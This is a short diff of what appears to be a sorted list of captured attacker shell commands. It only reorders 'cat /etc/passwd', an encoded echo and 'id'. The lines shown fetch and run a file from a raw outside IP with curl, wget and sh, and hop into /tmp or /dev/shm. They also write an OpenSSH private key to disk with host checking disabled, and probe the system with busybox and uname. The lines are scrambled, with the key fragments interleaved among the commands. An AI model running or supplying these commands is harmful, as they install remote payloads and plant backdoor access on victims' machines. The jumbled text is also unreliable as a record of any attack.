@@ -21,6 +21,9 @@ curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
+cat /etc/passwd
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+id
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 /bin/busybox TOKEN
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
@@ -29,11 +32,8 @@ Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
 QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 bash
-cat /etc/passwd
 cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
-echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 echo xsec
-id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
 /bin/./uname -s -v -n -r -m
